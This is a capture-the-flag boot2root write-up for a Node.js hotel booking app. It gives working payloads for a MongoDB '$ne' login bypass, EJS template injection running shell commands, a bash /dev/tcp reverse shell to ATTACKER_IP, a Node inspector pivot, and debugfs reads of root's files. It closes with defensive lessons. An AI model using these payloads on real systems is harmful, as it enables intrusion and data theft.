# Day - 7

---

**Challenge name:** Do Not Disturb

**Category:** Boot2Root

**Difficulty:** Medium

**Date completed:** 3rd of August 2026

---

## Summary

The Byte Lotus poolside booking platform (Node.js/Express) was vulnerable to NoSQL injection on its login form, bypassing authentication entirely. The authenticated staff console exposed a server-side EJS template preview feature, which was vulnerable to Server-Side Template Injection (SSTI), giving direct remote code execution as the `poolside` user. From there, a Node.js debug inspector left open on localhost (`--inspect=127.0.0.1:9229`) for a second service running as `pipelinesvc` allowed pivoting to that user via the Chrome DevTools Protocol. Finally, `pipelinesvc`'s membership in the `disk` group allowed raw block-device access, which was used with `debugfs` to read `/root/root.txt` directly - without ever needing a root shell.

---

### Step 1: Recon

```bash
nmap -sCV -F 10.49.143.78
```

Results showed:

- `22/tcp` - OpenSSH 9.6p1 (Ubuntu)
- `80/tcp` - Node.js (Express middleware), page titled "Byte Lotus - Poolside"

The web app was a staff/guest login portal ("Byte Lotus") for a hotel poolside booking system.

---

### Step 2: NoSQL injection on login

Inspecting the login form showed a standard `POST /login` with `username`/`password` fields. Since the backend was Express and likely backed by MongoDB, the classic operator-injection bypass was tested by sending JSON directly instead of form-encoded data:

```bash
curl -s -X POST http://10.49.143.78/login \
  -H "Content-Type: application/json" \
  -d '{"username":"attendant","password":{"$ne":"x"}}' -i
```

Response:

```jsx
{"ok":true,"role":"staff"}
```

The `$ne` (not-equal) operator caused the password check to match against "any password not equal to x", bypassing authentication entirely and returning a valid `connect.sid` session cookie with a `staff` role.

---

### Step 3: Discover the staff console

Using the authenticated session cookie, a `/staff/preview` endpoint was found - a "booking confirmation template" feature rendering EJS server-side:

```html
<textarea name="template">Dear <%= guest %>, your Byte Lotus cabana is confirmed.</textarea>
```

Since the input was rendered as an EJS template rather than a static string, this was tested for Server-Side Template Injection.

---

### Step 4: Confirm and exploit SSTI

```bash
curl -s -b cookies.txt -X POST http://10.49.143.78/staff/preview \
  --data-urlencode 'template=<%= 7*7 %>'
```

The preview returned `49`, confirming arbitrary EJS expression evaluation. EJS allows full JavaScript execution inside `<%= %>` tags, so this was escalated to OS command execution via Node's `child_process` module:

```bash
curl -s -b cookies.txt -X POST http://10.49.143.78/staff/preview \
  --data-urlencode 'template=<%= (function(){ return global.process.mainModule.require("child_process").execSync("id").toString(); })() %>'
```

Output:

```jsx
uid=996(poolside) gid=996(poolside) groups=996(poolside)
```

RCE confirmed as the `poolside` user.

---

### Step 5: Reverse shell and user flag

A netcat listener was started locally, and a reverse shell was triggered  (using `exec` instead of `execSync` to avoid blocking the HTTP request/response cycle):

```bash
curl -s -b cookies.txt -X POST http://10.49.143.78/staff/preview \
  --data-urlencode 'template=<%= global.process.mainModule.require("child_process").exec("bash -c \x27bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\x27") %>'
```

This returned an interactive shell as `poolside`:

```bash
find / -name "user.txt" 2>/dev/null
```

```jsx
THM{[REDACTED]}
```

---

### Step 6: Discover the exposed Node inspector

Enumerating running processes revealed a second Node.js service running as a different, more privileged user:

```bash
ps aux | grep -i node
```

```jsx
pipelin+ 599  /usr/bin/node --inspect=127.0.0.1:9229 processor.js
poolside 600  /usr/bin/node app.js
```

The `pipelinesvc` process was running with the Node.js debug **Inspector** protocol open on localhost. Since the current shell was already local to the box, this port was reachable:

```bash
curl -s http://127.0.0.1:9229/json
```

```jsx
"webSocketDebuggerUrl": "ws://127.0.0.1:9229/7de0f05f-ebec-4205-b906-958a592fb541"
```

---

### Step 7: Pivot to pipelinesvc via the Chrome DevTools Protocol

Wrote a small script which connected to the inspector's websocket and issued a `Runtime.evaluate` command to run shell commands in the `pipelinesvc` process's context:

```bash
node /tmp/pwn.js
```

```jsx
uid=995(pipelinesvc) gid=995(pipelinesvc) groups=995(pipelinesvc),6(disk)
```

---

### Step 8: Exploit `disk` group membership for raw filesystem access

Membership in the `disk` group grants read access to raw block devices, which bypasses normal file permissions entirely. The root partition was identified:

```bash
lsblk
mount | grep " / "
```

```jsx
nvme0n1p1  20G  part  /
/dev/nvme0n1p1 on / type ext4
```

With `debugfs` available on the box, root's file could be read directly from the raw device - without ever obtaining an actual root shell:

```jsx
process.mainModule.require('child_process').execSync('debugfs -R "cat /root/root.txt" /dev/nvme0n1p1 2>&1').toString()
```

```jsx
THM{[REDACTED]}
```

---

## Why this worked

The login form never checked what type of data it was getting, it just handed the JSON body straight to the Mongo query. Send a string, it compares strings like normal. Send an object like `{"$ne": "x"}` instead, and Mongo happily treats it as an operator, so the password check basically stops meaning anything. Classic case of trusting shape you never validated.

The SSTI was the same idea one layer up. The confirmation template box let staff write actual EJS instead of just filling in a fixed template, so the app wasn't rendering data, it was compiling and running whatever text got typed in. Once that's true, `<%= 7*7 %>` returning 49 is basically a green light to go straight for `child_process`.

The inspector was the part I didn't expect. `--inspect=127.0.0.1:9229` is safe in the sense that nothing external can reach it, but that assumption falls apart the moment you get any code execution at all on the box, even as a low-priv user. It's not protected by a password or a session, if you can hit that port, you can run JS in that process. It turned a second, otherwise unrelated service into a free privilege pivot.

And `disk` group membership is the kind of thing that looks harmless on a permissions list until you remember what it actually grants: raw read access to the block device, which means every file on that filesystem, root's included, regardless of what chmod says. `pipelinesvc` never needed sudo, it just needed to be in the right group.

---

## Lessons Learned

- Validate the type of incoming fields in NoSQL apps, not just their presence. A password field should only ever accept a string, reject anything else before it reaches the query.
- If a feature renders user text as a template, user input should only ever fill in variables inside a fixed template, never become the template itself.
- Don't run `--inspect` anywhere near production, even on localhost. It has no auth of its own, it trusts anything that can reach the port, including a shell you weren't supposed to have.
- Extra group memberships (`disk`, `docker`, `lxd`, etc.) deserve the same scrutiny as sudo rules. Easy to overlook during a permissions review, but they can hand out root-equivalent access without ever touching /etc/sudoers.
- None of these four issues was scary on its own. Stacked together, injection into RCE into a debug port into a group misconfig, they added up to full root.
